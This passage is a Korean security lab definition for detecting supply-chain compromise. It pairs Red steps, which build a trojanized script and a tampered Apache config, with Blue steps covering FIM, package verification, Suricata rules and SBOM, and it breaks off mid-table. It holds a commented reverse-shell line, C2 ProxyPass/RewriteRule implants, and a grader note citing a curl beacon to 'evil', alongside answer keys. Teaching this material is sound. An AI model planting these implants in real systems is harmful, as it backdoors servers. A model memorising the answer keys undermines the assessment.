lab_id: battle-adv-ai-week12
title: 공급망 공격 시나리오 — Supply Chain Compromise 탐지 (AI 지원)
version: ai
course: battle-adv-ai
week: 12
description: 공급망 공격(Supply Chain Compromise)을 시뮬레이션하고 탐지한다. 악성 패키지 삽입, 웹 서비스 변조, 설정 파일 조작을 Red Phase에서
  재현하고, Blue Phase에서 FIM, 패키지 무결성 검증, 변조 탐지를 구현한다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
difficulty: hard
duration_minutes: 150
objectives:
- 공급망 공격의 유형과 벡터를 이해한다
- 웹 서비스/설정 파일 변조를 시뮬레이션한다
- FIM과 패키지 무결성 검증으로 탐지한다
- 공급망 보안 강화 정책을 수립한다
prerequisites:
- battle-adv-nonai week11 이수
infra_requirements:
- attacker (10.20.30.201) — nmap, metasploit, sqlmap, hydra, nikto
- secu (10.20.30.1) — nftables, suricata
- web (10.20.30.80) — apache, modsecurity, JuiceShop(:3000), DVWA(:8080)
- siem (10.20.30.100) — wazuh-manager
pass_threshold: 0.6
steps:
- order: 1
  instruction: '[RED] 공급망 공격 시뮬레이션 — 악성 스크립트가 삽입된 가짜 패키지를 /tmp에 생성하라. 정상 유틸리티로 위장하되 백도어 코드를 포함하라.'
  hint: 정상 이름의 스크립트에 숨겨진 백도어 코드를 포함한다.
  category: exploit
  points: 10
  answer: '🤖 프롬프트: [RED] 공급망 공격 시뮬레이션 — 악성 스크립트가 삽입된 가짜 패키지를 /tmp에 생성해줘

    📎 참고 (CLI): cat > /tmp/supply_chain_package.sh << ''EOF'' #!/bin/bash # system-health-monitor v2.1.3
    (TROJANIZED) # Normal functionality echo "System Health: OK" uptime # Hidden backdoor (would be obfuscated
    in real attack) # bash -i >& /dev/tcp/10.20.30.201/4444 0>&1 echo "SUPPLY_CHAIN_BACKDOOR_SIM" > /tmp/sc_beacon.txt
    EOF chmod +x /tmp/supply_chain_package.sh && echo "Trojanized package created" && file /tmp/supply_chain_package.sh
    && sha256sum /tmp/supply_chain_package.sh'
  answer_detail: 공급망 공격(T1195.002)에서 공격자는 정상 소프트웨어에 백도어를 삽입한다. SolarWinds(2020), Codecov(2021) 등이 대표적
    사례이다. 정상 기능을 유지하면서 숨겨진 악성 코드를 포함한다.
  verify:
    type: output_contains
    expect: Trojanized package
    semantic:
      intent: '[RED] 공급망 가짜 패키지 — /tmp/malicious_util.sh 로 정상 유틸 가장 (echo Hello World 정상 출력) + 백도어 코드
        (curl http://evil/beacon & 무조건 실행) + chmod +x. 공급망 공격의 핵심: 정상 기능 + 숨겨진 악성 페이로드 트로이안 형태. MITRE
        T1195.002 Compromise Software Supply Chain'
      success_criteria:
      - /tmp/malicious_util.sh 파일 생성
      - 정상 기능 + 백도어 혼재 구조
      - chmod +x 실행 권한
      - T1195.002 매핑
      acceptable_methods:
      - cat > file + bash script 구조
      - python setup.py 악성 postinstall
      - npm package with malicious install script
      - apt package postinst
      negative_signs:
      - 단순 악성만 (정상 위장 없음)
      - T1195 매핑 없음
      - 실행 권한 없음
  target_vm: attacker
  script: 'cat > /tmp/supply_chain_package.sh << ''EOF'' #!/bin/bash # system-health-monitor v2.1.3 (TROJANIZED)
    # Normal functionality echo "System Health: OK" uptime # Hidden backdoor (would be obfuscated in real
    attack) # bash -i >& /dev/tcp/10.20.30.201/4444 0>&1 echo "SUPPLY_CHAIN_BACKDOOR_SIM" > /tmp/sc_beacon.txt
    EOF chmod +x /tmp/supply_chain_package.sh && echo "Trojanized package created" && file /tmp/supply_chain_package.sh
    && sha256sum /tmp/supply_chain_package.sh'
  risk_level: medium
  bastion_prompt: '[RED] 공급망 공격 시뮬레이션 — 악성 스크립트가 삽입된 가짜 패키지를 /tmp에 생성해줘'
- order: 2
  instruction: '[RED] 웹 서비스 변조 시뮬레이션 — /tmp에 변조된 웹 설정 파일을 생성하라. 정상 Apache 설정에 악성 리다이렉트를 숨겨라.'
  hint: Apache 설정에 숨겨진 ProxyPass를 추가하여 트래픽을 C2로 전달한다.
  category: exploit
  points: 10
  answer: '🤖 프롬프트: [RED] 웹 서비스 변조 시뮬레이션 — /tmp에 변조된 웹 설정 파일을 생성해줘

    📎 참고 (CLI): cat > /tmp/sc_apache_backdoor.conf << ''EOF'' # Apache configuration (COMPROMISED) <VirtualHost
    *:80> ServerName web.lab.local DocumentRoot /var/www/html # Normal config above... # Hidden C2 redirect
    (supply chain implant) # ProxyPass /health-check http://10.20.30.201:8080/beacon # ProxyPassReverse
    /health-check http://10.20.30.201:8080/beacon RewriteEngine On # RewriteRule ^/update-check$ http://10.20.30.201:8080/c2
    [P] </VirtualHost> EOF echo "Compromised Apache config created (simulation)" && sha256sum /tmp/sc_apache_backdoor.conf'
  answer_detail: 웹 서버 설정 변조(T1195)는 정상 설정에 ProxyPass/RewriteRule을 숨겨 특정 URL 패턴을 C2 서버로 리다이렉트한다. 설정 파일이
    길면 발견이 어렵다.
  verify:
    type: output_contains
    expect: COMPROMISED
    semantic:
      intent: '[RED] 웹 설정 변조 시뮬 — /tmp/apache_modified.conf 에 정상 Apache VirtualHost + 악성 RewriteRule (정상
        요청은 통과·특정 요청만 attacker.com 으로 302 리다이렉트). MITRE T1584.005 Compromise Infrastructure: Web Services.
        정상 운영자는 surface check 로 놓침'
      success_criteria:
      - /tmp/apache_modified.conf 파일 생성
      - 정상 설정 + 악성 RewriteRule 혼재
      - 302 또는 redirect 악용
      - T1584.005 매핑
      acceptable_methods:
      - cat > file + VirtualHost + RewriteRule
      - nginx proxy_pass 악용
      - .htaccess mod_rewrite
      - Nginx Lua 스크립트 삽입
      negative_signs:
      - 완전 악성 설정 (은닉성 없음)
      - 정상 기능 유지 안 됨
      - T1584 매핑 없음
  target_vm: attacker
  script: 'cat > /tmp/sc_apache_backdoor.conf << ''EOF'' # Apache configuration (COMPROMISED) <VirtualHost
    *:80> ServerName web.lab.local DocumentRoot /var/www/html # Normal config above... # Hidden C2 redirect
    (supply chain implant) # ProxyPass /health-check http://10.20.30.201:8080/beacon # ProxyPassReverse
    /health-check http://10.20.30.201:8080/beacon RewriteEngine On # RewriteRule ^/update-check$ http://10.20.30.201:8080/c2
    [P] </VirtualHost> EOF echo "Compromised Apache config created (simulation)" && sha256sum /tmp/sc_apache_backdoor.conf'
  risk_level: medium
  bastion_prompt: '[RED] 웹 서비스 변조 시뮬레이션 — /tmp에 변조된 웹 설정 파일을 생성해줘'
- order: 3
  instruction: '[BLUE] Phase 전환 — FIM(File Integrity Monitoring)을 설정하라. 웹 서버 설정, 시스템 바이너리, crontab에 대한
    Wazuh syscheck 규칙을 작성하라.'
  hint: Wazuh syscheck으로 critical 파일의 변경을 실시간 감시한다.
  category: defense
  points: 10
  answer: '🤖 프롬프트: [BLUE] Phase 전환 — FIM(File Integrity Monitoring)을 설정하라 구현 방법과 예시를 설명해줘

    📎 참고 (CLI): cat > /tmp/fim_supply_chain.xml << ''EOF'' <syscheck> <disabled>no</disabled> <frequency>300</frequency>
    <alert_new_files>yes</alert_new_files> <!-- Web server configs --> <directories check_all="yes" realtime="yes"
    report_changes="yes">/etc/apache2,/etc/nginx</directories> <!-- System binaries --> <directories check_all="yes"
    realtime="yes">/usr/bin,/usr/sbin,/usr/local/bin</directories> <!-- Cron and systemd --> <directories
    check_all="yes" realtime="yes">/etc/crontab,/var/spool/cron,/etc/systemd/system</directories> <!--
    Package manager --> <directories check_all="yes" realtime="yes">/etc/apt/sources.list.d</directories>
    <!-- Ignore false positives --> <ignore type="sregex">.swp$|.swx$|~$</ignore> </syscheck> EOF cat
    /tmp/fim_supply_chain.xml'
  answer_detail: FIM은 공급망 공격에서 변조된 파일을 탐지하는 핵심 방어이다. 웹 서버 설정, 시스템 바이너리, 크론, 패키지 소스를 실시간 감시하고 변경 내용을 보고한다.
  verify:
    type: output_contains
    expect: syscheck
    semantic:
      intent: '[BLUE] FIM 설정 확장 — /etc/aide/aide.conf 편집 + aide --init + aide --check 로 웹 서버 설정(/etc/apache2/·/etc/nginx/)
        + 시스템 바이너리(/usr/bin·/usr/sbin) + cron(/etc/cron.*) + 부팅(/boot) 모니터링. AIDE Advanced Intrusion Detection
        Environment 통합 FIM. baseline.db 암호화 보호'
      success_criteria:
      - AIDE 또는 Tripwire 설정
      - 웹·시스템·cron 3 영역 모니터
      - baseline 생성 (aide --init)
      acceptable_methods:
      - aide --init + --check
      - Tripwire twinstall.sh
      - Wazuh syscheck 모듈 통합
      - osquery file_events
      negative_signs:
      - FIM 도구 없이 수동 해시
      - baseline 없음
      - 영역 1개만
  target_vm: siem
  script: cat > /tmp/fim_supply_chain.xml << 'EOF' <syscheck> <disabled>no</disabled> <frequency>300</frequency>
    <alert_new_files>yes</alert_new_files> <!-- Web server configs --> <directories check_all="yes" realtime="yes"
    report_changes="yes">/etc/apache2,/etc/nginx</directories> <!-- System binaries --> <directories check_all="yes"
    realtime="yes">/usr/bin,/usr/sbin,/usr/local/bin</directories> <!-- Cron and systemd --> <directories
    check_all="yes" realtime="yes">/etc/crontab,/var/spool/cron,/etc/systemd/system</directories> <!--
    Package manager --> <directories check_all="yes" realtime="yes">/etc/apt/sources.list.d</directories>
    <!-- Ignore false positives --> <ignore type="sregex">.swp$|.swx$|~$</ignore> </syscheck> EOF cat
    /tmp/fim_supply_chain.xml
  risk_level: low
  bastion_prompt: '[BLUE] Phase 전환 — FIM(File Integrity Monitoring)을 설정하라. 웹 서버 설정, 시스템 바이너리, crontab에
    대한 Wazuh syscheck 규칙을 작성하라.'
- order: 4
  instruction: '[BLUE] 패키지 무결성 검증 스크립트를 작성하라. dpkg --verify로 시스템 패키지의 변조를 탐지하고, 핵심 바이너리의 해시를 검증하라.'
  hint: dpkg --verify와 sha256sum으로 무결성을 검증한다.
  category: defense
  points: 10
  answer: '🤖 프롬프트: [BLUE] 패키지 무결성 검증 스크립트를 구현 방법을 설명하고 예시 코드를 보여줘

    📎 참고 (CLI): echo "=== Package Integrity Verification ===" && echo "[1] dpkg verify (modified packages):"
    && dpkg --verify 2>/dev/null | head -10 || echo "  dpkg verify not available" && echo "[2] Critical
    binary hashes:" && for bin in /usr/bin/ssh /usr/bin/curl /usr/bin/python3; do if [ -f "$bin" ]; then
    echo "  $(sha256sum $bin)"; fi; done && echo "[3] Baseline comparison:" && echo "  Store hashes in
    /etc/security/baseline_hashes.txt" && echo "  Compare daily with: sha256sum -c baseline_hashes.txt"
    && echo "Package integrity check complete"'
  answer_detail: 패키지 무결성 검증은 공급망 공격으로 변조된 바이너리를 탐지한다. dpkg --verify는 설치된 패키지의 해시를 검증하고, 핵심 바이너리의 SHA256을
    기준선과 비교한다.
  verify:
    type: output_contains
    expect: Package Integrity
    semantic:
      intent: '[BLUE] 패키지 무결성 검증 스크립트 — dpkg --verify 전체 패키지 변조 탐지 (S5 체크섬 불일치 · M5 권한 불일치 · T5 타임스탬프
        불일치) + sha256sum /bin/bash /bin/sh /usr/bin/python3 등 핵심 바이너리 해시 비교 with 알려진 정상 해시. apt download
        --print-uris 로 원본 패키지 재검증'
      success_criteria:
      - dpkg --verify 또는 rpm -V (RHEL)
      - 핵심 바이너리 sha256 검증
      - 알려진 정상 해시 비교
      acceptable_methods:
      - dpkg --verify + sha256sum
      - rpm -Va (RHEL)
      - debsums -s (Debian)
      - AIDE 통합
      negative_signs:
      - 패키지 검증 없이 파일만
      - 해시 비교 기준 없음
      - 변조 감지 개념 없음
  target_vm: web
  script: 'echo "=== Package Integrity Verification ===" && echo "[1] dpkg verify (modified packages):"
    && dpkg --verify 2>/dev/null | head -10 || echo "  dpkg verify not available" && echo "[2] Critical
    binary hashes:" && for bin in /usr/bin/ssh /usr/bin/curl /usr/bin/python3; do if [ -f "$bin" ]; then
    echo "  $(sha256sum $bin)"; fi; done && echo "[3] Baseline comparison:" && echo "  Store hashes in
    /etc/security/baseline_hashes.txt" && echo "  Compare daily with: sha256sum -c baseline_hashes.txt"
    && echo "Package integrity check complete"'
  risk_level: low
  bastion_prompt: '[BLUE] 패키지 무결성 검증 스크립트를 작성하라. dpkg --verify로 시스템 패키지의 변조를 탐지하고, 핵심 바이너리의 해시를 검증하라.'
- order: 5
  instruction: '[BLUE] Suricata로 공급망 공격 관련 네트워크 시그니처를 탐지하는 규칙을 작성하라. 비인가 외부 연결, 비정상 업데이트 트래픽을 탐지하라.'
  hint: 내부 서버에서 비인가 외부 IP로의 연결을 탐지한다.
  category: defense
  points: 10
  answer: '🤖 프롬프트: [BLUE] Suricata로 공급망 공격 관련 네트워크 시그니처를 탐지하는 규칙을 구현 방법을 설명하고 예시 코드를 보여줘

    📎 참고 (CLI): cat > /tmp/supply_chain_detection.rules << ''EOF'' # Supply chain attack indicators alert
    http 10.20.30.80 any -> !10.20.30.0/24 any (msg:"SUPPLY-CHAIN: Web server unexpected outbound HTTP";
    flow:to_server,established; sid:6000001; rev:1;) alert tls 10.20.30.80 any -> !10.20.30.0/24 any (msg:"SUPPLY-CHAIN:
    Web server unexpected outbound TLS"; flow:to_server,established; sid:6000002; rev:1;) alert http any
    any -> 10.20.30.0/24 any (msg:"SUPPLY-CHAIN: Suspicious update URL pattern"; flow:to_server,established;
    content:"/update-check"; http.uri; sid:6000003; rev:1;) EOF cat /tmp/supply_chain_detection.rules'
  answer_detail: 공급망 공격 탐지에서 웹 서버의 비인가 아웃바운드 연결(ProxyPass를 통한 C2), 의심스러운 업데이트 URL 패턴을 Suricata로 탐지한다.
    웹 서버는 일반적으로 아웃바운드 연결을 하지 않는다.
  verify:
    type: output_contains
    expect: SUPPLY-CHAIN
    semantic:
      intent: '[BLUE] Suricata 공급망 네트워크 시그니처 — alert http (비표준 외부 연결 목적지 - apt/npm 공식 저장소 외부) + alert
        http (비정상 업데이트 트래픽 - ubuntu update 시간 외 apt 연결) + alert dns (수상한 CDN 도메인 requestbin/ngrok 등).
        공급망 compromise 의 네트워크 지표. /etc/suricata/rules/local.rules 에 추가'
      success_criteria:
      - 비인가 외부 연결 룰
      - 비정상 업데이트 트래픽 룰
      - 공급망 특화 시그니처
      acceptable_methods:
      - alert http + 허용 목적지 whitelist
      - alert dns + Spamhaus 블랙리스트
      - ET Policy 룰셋 활용
      negative_signs:
      - 일반 웹 공격 룰만
      - 공급망 특화 아님
      - 허용 목적지 개념 없음
  target_vm: secu
  script: 'cat > /tmp/supply_chain_detection.rules << ''EOF'' # Supply chain attack indicators alert http
    10.20.30.80 any -> !10.20.30.0/24 any (msg:"SUPPLY-CHAIN: Web server unexpected outbound HTTP"; flow:to_server,established;
    sid:6000001; rev:1;) alert tls 10.20.30.80 any -> !10.20.30.0/24 any (msg:"SUPPLY-CHAIN: Web server
    unexpected outbound TLS"; flow:to_server,established; sid:6000002; rev:1;) alert http any any -> 10.20.30.0/24
    any (msg:"SUPPLY-CHAIN: Suspicious update URL pattern"; flow:to_server,established; content:"/update-check";
    http.uri; sid:6000003; rev:1;) EOF cat /tmp/supply_chain_detection.rules'
  risk_level: low
  bastion_prompt: '[BLUE] Suricata로 공급망 공격 관련 네트워크 시그니처를 탐지하는 규칙을 작성하라. 비인가 외부 연결, 비정상 업데이트 트래픽을 탐지하라.'
- order: 6
  instruction: '[BLUE] 공급망 보안 강화를 위한 SBOM(Software Bill of Materials) 관리 정책을 설계하라.'
  hint: 소프트웨어 구성 요소 목록, 취약점 추적, 업데이트 정책을 정의한다.
  category: defense
  points: 10
  answer: '🤖 프롬프트: [BLUE] 공급망 보안 강화를 위한 SBOM(Software Bill of Materials) 관리 정책을 구현 방법을 설명하고 예시 코드를 보여줘

    📎 참고 (CLI): cat > /tmp/sbom_policy.txt << ''EOF'' === Software Bill of Materials (SBOM) Policy ===

    1. SBOM Requirements: - All deployed software must have SBOM (SPDX or CycloneDX format) - SBOM updated
    on every release/patch - Includes: name, version, license, dependencies, hashes

    2. Vulnerability Tracking: - Daily CVE scan against SBOM components - Critical CVE: patch within 24
    hours - High CVE: patch within 7 days - Medium CVE: patch within 30 days

    3. Supply Chain Controls: - Package sources: Only official repositories + verified mirrors - Binary
    verification: SHA256 hash check before deployment - Code signing: All internal packages must be signed
    - Dependency pinning: Lock versions in requirements files

    4. Infrastructure SBOM (10.20.30.0/24): | Server | Key Software | Version | |--------|-------------|---------|
